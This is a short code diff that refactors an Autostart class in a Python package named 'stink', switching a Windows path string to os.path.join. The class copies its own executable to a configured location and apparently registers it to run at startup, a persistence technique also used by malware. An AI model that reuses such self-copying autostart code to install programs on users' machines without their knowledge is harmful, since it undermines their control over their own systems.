@@ -1,3 +1,4 @@
+from os import path
 from shutil import copyfile
 
 from stink.helpers.config import AutostartConfig
@@ -10,7 +11,6 @@ class Autostart:
     def __init__(self, executor_path: str):
 
         self.__executor_path = executor_path
-
         self.__config = AutostartConfig()
 
     def __create_copy(self) -> None:
@@ -19,7 +19,7 @@ class Autostart:
         :return: None
         """
         self.executor_name = self.__executor_path.replace("\\", "/").split("/")[-1]
-        copyfile(self.__executor_path, rf"{self.__config.ExecutorPath}\{self.executor_name}")
+        copyfile(self.__executor_path, path.join(self.__config.ExecutorPath, self.executor_name))
 
     def __add_to_autostart(self) -> None:
         """
